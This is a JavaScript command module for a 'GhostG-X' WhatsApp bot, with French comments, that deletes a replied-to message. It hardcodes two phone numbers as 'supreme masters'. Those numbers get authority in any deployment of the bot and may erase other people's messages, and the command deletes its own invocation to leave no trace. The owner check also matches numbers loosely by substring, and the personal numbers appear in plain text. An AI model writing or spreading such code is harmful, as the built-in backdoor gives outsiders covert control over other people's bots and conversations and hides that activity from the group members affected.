/**
 * Erreur Command - GhostG-X Edition
 * Supprime un message auquel tu as répondu (Maître Suprême bypass les restrictions)
 */

const config = require('../../config.js');

function toSmallCaps(text) {
  const normal = "abcdefghijklmnopqrstuvwxyz0123456789";
  const smallCaps = "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ0123456789";

  const cleanedText = text.toLowerCase()
    .normalize("NFD").replace(/[\u0300-\u036f]/g, ""); 

  return cleanedText.split('').map(c => {
    const index = normal.indexOf(c);
    return index !== -1 ? smallCaps[index] : c;
  }).join('');
}

const prefix = config.prefix || '.';

module.exports = {
  name: 'erreur',
  aliases: ['er', 'e','error'],
  category: '♛ sᴏᴜᴠᴇʀᴀɪɴᴇᴛᴇ́',
  description: '『 ɢʜᴏsᴛɢ-𝐗 』➪ sᴜᴘᴘʀɪᴍᴇ ᴜɴ ᴍᴇssᴀɢᴇ ᴇɴ ʏ ʀᴇᴘᴏɴᴅᴀɴᴛ (ᴘᴏᴜᴠᴏɪʀ ᴀʙsᴏʟᴜ ᴘᴏᴜʀ ʟᴇ ᴍᴀɪᴛʀᴇ)',
  usage: `${prefix}erreur`,

  async execute(sock, msg, args, extra) {
    const { from, reply, react } = extra;

    try {
      // 👑 Tes numéros de Maîtres Suprêmes en clair
      const supremeOwners = ['22651622652', '22665108174'];

      const senderJid = msg.key.participant || msg.key.remoteJid;
      const senderNumber = senderJid.replace(/\D/g, '');

      // Routines d'authentification souveraine
      const isMaster = supremeOwners.includes(senderNumber);

      const isConfigOwner = config.ownerNumber && config.ownerNumber.some(n => {
        const cleanN = String(n).replace(/\D/g, '');
        return senderNumber.includes(cleanN) || cleanN.includes(senderNumber);
      });

      // Seul le bot lui-même, l'owner configuré ou l'un de tes 2 numéros maîtres peuvent invoquer la commande
      const isMe = msg.key.fromMe || isConfigOwner || isMaster;

      if (!isMe) {
        return reply(`*❌ ${toSmallCaps('acces refuse. seul le maitre peut manier la gomme du spatio-temporel')}.*\n\n> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`);
      }

      const ctx = msg.message?.extendedTextMessage?.contextInfo;

      if (!ctx?.stanzaId) {
        return reply(
          `╭╼━≪• *💥 ᴇᴠᴀᴘᴏʀᴀᴛɪᴏɴ_ɪᴍᴍᴇᴅɪᴀᴛᴇ* •≫━╾╮\n` +
          `┃ *ᴇ́ᴛᴀᴛ* : ᴇ́ᴄʜᴇᴄ ❌\n` +
          `╰━━━━━━━━━━━━━━━╯\n\n` +
          `*🔮 ɪɴᴄᴀɴᴛᴀᴛɪᴏɴ :*\n` +
          `*${toSmallCaps('reponds au message que tu souhaites effacer')}.*\n\n` +
          `  ${prefix}erreur\n\n` +
          `> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`
        );
      }

      const botJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
      const quotedParticipant = ctx.participant || ctx.remoteJid;

      const isFromMe = quotedParticipant.includes(botJid) || msg.key.fromMe;

      // 🛡️ SYSTÈME D'OMNIPOTENCE : 
      // Si tu es le maître suprême (isMaster), on ignore la règle de "qui possède le message". 
      // Tu peux TOUT supprimer. Sinon, on garde la règle d'origine pour les autres owners.
      if (!isMaster && !isFromMe) {
        return reply(`*⚠️ ${toSmallCaps('ce message ne t\'appartient pas. utilise la commande')} \`${prefix}delete\` ${toSmallCaps('pour les messages des autres')}.*`);
      }

      const deleteTargetKey = { 
        remoteJid: from, 
        id: ctx.stanzaId, 
        fromMe: isFromMe // Vrai si c'est le bot, Faux si c'est quelqu'un d'autre (et que tu forces l'effacement)
      };

      if (from.endsWith('@g.us')) {
        deleteTargetKey.participant = quotedParticipant;
      }

      const deleteCommandKey = {
        remoteJid: from,
        id: msg.key.id,
        fromMe: true
      };

      await react('🪄'); 

      // Effacement du message ciblé
      await sock.sendMessage(from, { delete: deleteTargetKey });
      
      // Effacement de ton invocation pour ne laisser aucune trace
      await sock.sendMessage(from, { delete: deleteCommandKey });

    } catch (error) {
      // Échec silencieux des protocoles
      await reply(`*❌ ${toSmallCaps('impossible de faire disparaitre ce message')}.*\n\n> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`);
    }
  }
};
